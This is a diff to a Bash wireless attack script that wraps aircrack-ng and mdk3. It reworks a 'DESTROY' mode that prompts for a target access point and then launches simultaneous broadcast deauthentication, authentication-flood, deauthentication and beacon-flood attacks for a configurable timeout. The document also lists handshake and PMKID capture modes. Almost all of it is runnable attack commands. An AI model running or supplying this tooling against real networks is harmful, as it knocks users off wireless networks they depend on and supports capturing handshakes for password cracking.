@@ -33,8 +33,10 @@ function helpPanel(){
 	echo -e "\t\t${turquoise}handshake${end}"
 	echo -e "\t\t${turquoise}PKMID${end}"
 	echo -e "\t\t${turquoise}ALL${end}"
+	echo -e "\t\t${red}DESTROY${end}"
 	echo -e "\t${blue}┃${end}  ${purple}[-i]${end}${yellow} Interface in monitor mode${end}"
 	echo -e "\t${blue}┃${end}  ${purple}[-m]${end}${yellow} MAC address${end}"
+	echo -e "\t${blue}┃${end}  ${purple}[-t]${end}${yellow} Timeout${end}"
 	echo -e "\t${blue}┃${end}  ${purple}[-l]${end}${yellow} List red interfaces${end}"
 	echo -e "\t${blue}┃${end}  ${purple}[-h]${end}${yellow} Show this help panel${end}"
 	echo -e "\n\t${purple}Use examples:${end}\n"
@@ -43,6 +45,7 @@ function helpPanel(){
 	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}handshake${end} ${turquoise}-m${end} ${gray}fc:e5:57:fc:ad:b4${end} ${turquoise}-i${end} ${gray}wlan0mon${end}"
 	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}PKMID${end} ${turquoise}-i${end} ${gray}wlan0mon${end}"
 	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}ALL${end} ${turquoise}-i${end} ${gray}wlan0mon${end}"
+	echo -e "\t\t${green}$0${end} ${turquoise}-a${end} ${gray}DESTROY${end} ${turquoise}-i${end} ${gray}wlan0mon${end} ${turquoise}-t${end} ${gray}40${end}"
 }
 
 function config(){
@@ -161,19 +164,28 @@ function PKMID(){
 
 function destroy(){
 	clear; tput civis
-	banner; xterm -hold -T "AIRODUMP-NG" -geometry 100x30 -e "airodump-ng -c $c --essid $e ${card}" &
+	banner
 
-	echo -ne "\n${yellow}[*]${end}${gray} AP ESSID: ${end}"; read e
-        echo -ne "\n${yellow}[*]${end}${gray} AP BSSID: ${end}"; read b
-	echo -ne "\n${yellow}[*]${end}${gray} AP CHANNEL: ${end}"; read c
+	echo -e "\n\t  ${red}█ INITIALIZING! █${end}"
 
-	sleep 2; xterm -e "aireplay-ng -0 0 -e $e -c FF:FF:FF:FF:FF:FF ${card}" &
+	xterm -hold -T "AIRODUMP-NG" -geometry 100x30 -e "airodump-ng ${card}" &
+	airodump=$!
 
-	sleep 2; xterm -T "MDK3-AUTHENTICATING" -geometry 100x30 -e "mdk3 ${card} a -a F8:5B:3B:58:A1:F9" &
+	echo -ne "\n${red}[*]${end}${gray} AP ESSID: ${end}"; read e
+        echo -ne "\n${red}[*]${end}${gray} AP BSSID: ${end}"; read b
+	echo -ne "\n${red}[*]${end}${gray} AP CHANNEL: ${end}"; read c
 
-	sleep 2; xterm -T "MDK3-DEAUTHENTICATING" -geometry 50x10 -e "mdk3 ${card} d -a F8:5B:3B:58:A1:F9" &
+	kill -9 $airodump
+	wait $airodump 2>/dev/null
 
-	sleep 2; xterm -T "MDK3-NETWOR_SPECTRUM" -geometry 100x30 -e "mdk3 ${card} b -a -s 1000 -c $c" &
+	echo -e "\n\n\t${red}████ LETS GOOOO! ████${end}"
+
+	xterm -hold -T "AIRODUMP-NG" -geometry 100x30 -e "timeout $time_out bash -c \"airodump-ng -c $c --essid $e ${card}\"" &
+
+	sleep 3; xterm -T "AIREPLAY-DEAUTHENTICATING" -geometry 100x25 -e "timeout $time_out bash -c \"aireplay-ng -0 0 -e $e -c FF:FF:FF:FF:FF:FF ${card}\"" &
+	sleep 3; xterm -T "MDK3-AUTHENTICATING" -geometry 70x30 -e "timeout $time_out bash -c \"mdk3 ${card} a -a $b\"" &
+	sleep 3; xterm -T "MDK3-DEAUTHENTICATING" -geometry 60x20 -e "timeout $time_out bash -c \"mdk3 ${card} d -a $b\"" &
+	sleep 3; xterm -T "MDK3-NETWOR_SPECTRUM" -geometry 60x20 -e "timeout $time_out bash -c \"mdk3 ${card} b -a -s 1000 -c $c\"" &
 
 	tput cnorm
 }
@@ -181,11 +193,12 @@ function destroy(){
 #══════════════┃ MAIN ┃═════════════
 
 if [ "$(id -u)" == "0" ]; then
-	declare -i parameter_counter=0; while getopts ":a:i:m:l:h:" arg; do
+	declare -i parameter_counter=0; while getopts ":a:i:m:t:l:h:" arg; do
 		case $arg in
 			a) attack_mode=$OPTARG; let parameter_counter+=1;;
 			i) card=$OPTARG; let parameter_counter+=1;;
 			m) mac=$OPTARG; let parameter_counter+=1;;
+			t) time_out=$OPTARG; let parameter_counter+=1;;
 			l) listInterfaces;;
 			h) helpPanel;;
 		esac
@@ -206,8 +219,13 @@ if [ "$(id -u)" == "0" ]; then
 			config; PKMID
 		elif [ "$(echo $attack_mode)" == "ALL" ]; then
 			config; handshake; PKMID
-		elif [ "$(echo $attack_mode)" == "destroy" ]; then
-			config; destroy
+		elif [ "$(echo $attack_mode)" == "DESTROY" ]; then
+			if [ ! $time_out ]; then
+				declare -i time_out=60
+				config; destroy
+			else
+				config; destroy
+			fi
 		fi
 		tput cnorm; airmon-ng stop ${card} > /dev/null 2>&1
 	fi
